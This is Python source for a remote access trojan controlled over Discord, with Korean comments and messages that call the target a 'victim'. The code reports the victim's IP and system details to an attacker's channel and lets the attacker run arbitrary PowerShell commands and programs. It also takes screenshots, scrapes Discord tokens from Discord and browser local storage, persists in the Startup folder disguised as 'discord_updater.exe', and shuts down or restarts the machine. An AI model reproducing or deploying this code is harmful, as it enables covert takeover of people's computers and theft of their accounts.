commands = "\n".join([ # 명령어 목록
    ">help - help command",
    ">ls - show directory",
    ">shell - execute script",
    ">run <filename> - run an file",
    ">startup - add to startup",
    ">shutdown - shutdown victim's computer",
    ">restart - restart victim's computer",
    ">token - grab tokens",
    ">cd - change directory",
    ">screenshot - took a picture of victim's computer"
    ">exit - exit the program",
])

import discord
import os, sys
import re, json
import shutil
import pyautogui
import requests, subprocess

def res_path(relative_path):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

def get_processor():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

def get_gpu():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_VideoController -ComputerName. | Select-Object -Property Name"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

def get_os():
    stdout = subprocess.Popen(
        ["powershell.exe", "Get-WmiObject -Class Win32_OperatingSystem -ComputerName. | Select-Object -Property Caption"], stdout=subprocess.PIPE, shell=True
    ).stdout.read().decode()
    return stdout.split("\n")[3]

try:
    config = json.loads(open("bot_conf.json", "r").read())
except Exception as e:
    print(e)

intents = discord.Intents.all()
bot = discord.Client(intents=intents)
session_id = os.urandom(8).hex() # 해킹에 성공했을 때 만들어지는 피해자를 목록별로 구분하기 위한 세션
token = config["token"]
guild_id = config["guild_id"]

@bot.event
async def on_ready():
    guild = bot.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip = requests.get("https://api.ipify.org").text
    embed = discord.Embed(title="새 세션이 생성되었습니다!", description="", color=0x1ABC9C)
    embed.add_field(name="세션 ID", value=f"```{session_id}```", inline=True)
    embed.add_field(name="유저이름", value=f"```{os.getlogin()}```", inline=True)
    embed.add_field(name="🛰️  네트워크 정보", value=f"```아이피: {ip}```", inline=False)
    sys_info = "\n".join([
        f"OS: {get_os()}",
        f"CPU: {get_processor()}",
        f"GPU: {get_gpu()}"
    ])
    embed.add_field(name="🖥️  시스템 정보", value=f"```{sys_info}```", inline=False)
    embed.add_field(name="🤖  명령어 목록", value=f"```{commands}```", inline=False)

    await channel.send(embed=embed)

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    if message.channel.name != session_id:
        return
    
    if message.content == ">help":
        embed = discord.Embed(title="명령어 목록", description=f"```{commands}```", color=0x1ABC9C)
        await message.reply(embed=embed)

    if message.content.startswith(">cd"):
        directory = message.content.split(" ")[1]
        try:
            os.chdir(directory)
            embed = discord.Embed(title="디렉토리 변경됨", description=f"```{os.getcwd()}```", color=0x1ABC9C)
        except:
            embed = discord.Embed(title="엘ㄹ러", description=f"```그딴 거 없어요```", color=0x1ABC9C)
        await message.reply(embed=embed)

    if message.content == ">ls":
        files = "\n".join(os.listdir())
        if files == "":
            files = "빈 디렉토리임"
        embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0x1ABC9C)
        await message.reply(embed=embed)

    if message.content.startswith(">shell"):
        command = message.content.split(" ")[1]
        output = subprocess.Popen(
            ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True
        ).communicate()[0].decode("utf-8")
        if output == "":
            output = "결과가 안출력됨."
        embed = discord.Embed(title=f"쉘 접속됨 > {os.getcwd()}", description=f"```{output}```", color=0x1ABC9C)
        await message.reply(embed=embed)

    if message.content.startswith(">run"):
        file = message.content.split(" ")[1]
        subprocess.Popen(file, shell=True)
        embed = discord.Embed(title="시작되었습니다.", description=f"```{file}```", color=0x1ABC9C)
        await message.reply(embed=embed)

    if message.content == ">exit":
        await message.channel.delete()
        await bot.close()

    if message.content == ">screenshot":
        screenshot = pyautogui.screenshot()
        path = os.path.join(os.getenv("TEMP"), "screenshot.png")
        screenshot.save(path)
        file = discord.File(path)
        embed = discord.Embed(title="스샷찍음", color=0x1ABC9C)
        embed.set_image(url="attachment://screenshot.png")
        await message.reply(embed=embed, file=file)

    if message.content == ">token":
        paths = [
            os.path.join(os.getenv("APPDATA"), ".discord", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), ".discordcanary", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), ".discordptb", "Local Storage", "leveldb"),
            os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),
            os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera", "Local Storage", "leveldb"),
        ]
        tokens = []
        for path in paths:
            if not os.path.exists(path):
                continue
            
            for file in os.listdir(path):
                if not file.endswith(".log") and not file.endswith(".ldb"):
                    continue

                for line in [x.strip() for x in open(os.path.join(path, file), errors="ignore").readlines() if x.strip()]: # 토큰 찾는 정규식
                    for regex in [r"[\w-]{24}\.[\w-]{6}\.[\w-]{38}", r"mfa\.[\w-]{84}"]:
                        for token in re.findall(regex, line):
                            tokens.append(token)
                            
        tokens = "\n".join(tokens)
        if tokens == "":
            tokens = "토큰 못찾음 ㅠ"
        embed = discord.Embed(title="토큰", description=f"```{tokens}```", color=0x1ABC9C)
        await message.reply(embed=embed)

    if message.content == ">startup":
        path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        try:
            shutil.copyfile(os.path.join(os.getcwd(), __file__), os.path.join(path, "discord_updater.exe"))
            embed = discord.Embed(title="시작프로그램 등록 성공", description=f"```{os.path.join(path, 'discord_updater.exe')}```", color=0x1ABC9C)
            await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="오류", description=f"```철저한 놈입니다..보스..```", color=0x1ABC9C)
            await message.reply(embed=embed)

    if message.content == ">shutdown":
        await message.channel.delete()
        await bot.close()
        os.system("shutdown /s /t 0")

    if message.content == ">restart":
        await message.channel.delete()
        await bot.close()
        os.system("shutdown /r /t 0")

bot.run(token, log_handler=None)